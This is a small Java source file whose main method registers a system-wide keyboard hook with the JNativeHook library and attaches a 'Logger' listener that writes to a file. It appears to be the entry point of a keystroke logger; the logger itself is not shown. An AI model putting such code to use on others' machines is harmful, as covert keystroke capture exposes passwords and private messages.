package random;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.IOException;

public class Main {

    public static void main(String[] args) {

        String filePath = args.length > 0 ? args[0] : "";

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Logger(filePath));
        } catch (NativeHookException | IOException e) {
            e.printStackTrace();
        }
    }
}
